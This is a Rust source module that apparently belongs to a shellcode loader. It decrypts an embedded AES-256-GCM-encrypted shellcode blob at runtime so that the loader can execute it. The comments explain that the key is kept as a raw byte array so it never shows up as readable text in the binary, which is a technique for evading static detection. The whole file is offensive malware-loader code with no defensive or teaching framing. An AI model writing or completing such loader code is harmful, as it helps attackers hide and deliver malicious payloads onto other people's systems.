//! crypto.rs — AES-256-GCM runtime decryption
//!
//! The encrypted shellcode blob and the key/nonce constants live in
//! shellcode.rs.  This module provides the single `decrypt` function that
//! the loader calls at runtime to recover the plaintext shellcode bytes.
//!
//! The key is stored as a raw [u8; 32] constant — never a string literal —
//! so it does not appear in the binary's .rodata section as printable ASCII.

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};

use crate::shellcode::{ENCRYPTED_SHELLCODE, KEY, NONCE};

/// Decrypt the embedded shellcode blob.
///
/// Returns `Ok(Vec<u8>)` containing the raw shellcode on success, or
/// `Err(&'static str)` if the GCM authentication tag does not verify
/// (tampered binary, wrong key, etc.).
pub fn decrypt() -> Result<Vec<u8>, &'static str> {
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&KEY));
    let nonce  = Nonce::from_slice(&NONCE);

    cipher
        .decrypt(nonce, ENCRYPTED_SHELLCODE.as_ref())
        .map_err(|_| "AES-GCM decryption failed: bad tag or tampered ciphertext")
}
